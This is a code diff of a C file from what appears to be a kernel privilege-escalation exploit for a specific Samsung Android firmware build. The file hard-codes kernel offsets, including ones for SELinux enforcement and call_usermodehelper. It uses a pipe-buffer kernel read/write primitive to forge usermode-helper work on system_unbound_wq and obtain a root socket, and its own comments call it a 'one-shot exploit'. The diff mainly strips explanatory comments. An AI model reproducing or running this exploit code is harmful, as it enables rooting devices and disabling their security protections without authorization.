@@ -1,3 +1,8 @@
+/*
+ * Queues a usermode-helper work item through system_unbound_wq. Prepares the
+ * work structures in controlled memory, updates workqueue state, wakes a
+ * worker, and waits for the root socket.
+ */
 #define _GNU_SOURCE
 #include <fcntl.h>
 #include <stddef.h>
@@ -13,10 +18,6 @@
 #include "09_pipe_buffer_rw.h"
 #include "10_workqueue_umh_root.h"
 
-/* target.h constants for dm3q-S918BXXSAFZH3, inlined per this
- * project's established style (05_mm_slab_grooming.c/04_fake_kernel_objects.c do the same
- * rather than #include the old engine's target.h). Values copied
- * verbatim, not re-derived. */
 #define SELINUX_ENFORCING_OFF 0x02d8e5c0ULL
 #define SYSTEM_UNBOUND_WQ_OFF 0x02a90800ULL
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL
@@ -40,8 +41,6 @@
 
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 
-/* source: this project's src/root.c -- identical layouts, already
- * BTF/offsetof-verified there. */
 struct umh_subprocess_info {
   uint8_t work[48];
   uint64_t complete;
@@ -102,9 +101,6 @@ static int pipe_write64(int fd, uint64_t target_addr, uint64_t value) {
   return oss_pipe_rw_write(fd, target_addr, &value, sizeof(value));
 }
 
-/* source: root.c:wake_system_unbound -- generic pty-alloc trick to
- * force a system_unbound_wq flush without depending on any specific
- * kernel offset. */
 static int wake_system_unbound(void) {
   char slave_name[128];
   int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
@@ -318,11 +314,6 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
     return 0;
   }
 
-  /* Blob preparation can take long enough for the shared pool to change.
-   * Require two consecutive, complete snapshots immediately before publish;
-   * a partial list-only check missed concurrent counter/pwq changes. A busy
-   * system_unbound_wq is transient, so wait briefly for the original safe
-   * state instead of failing the entire one-shot exploit immediately. */
   oss_diag_checkpoint("umh-prepublish-snapshot");
   struct workqueue_snapshot snapshot_a = {0}, snapshot_b = {0},
                             snapshot_c = {0};
@@ -447,9 +438,6 @@ int root_umh_install_fd(int fd, uint64_t kernel_base, uint64_t page_base,
                                      NULL, 0);
 }
 
-/* Compatibility entry point for standalone harnesses. Production passes the
- * already verified descriptor to root_umh_install_fd(), matching the closed
- * binary's single-FD lifetime. Never retry a partially queued work item. */
 int root_umh_install(uint64_t kernel_base, uint64_t page_base,
                      const char *root_umh_path) {
   int fd = oss_open_kernel_rw();
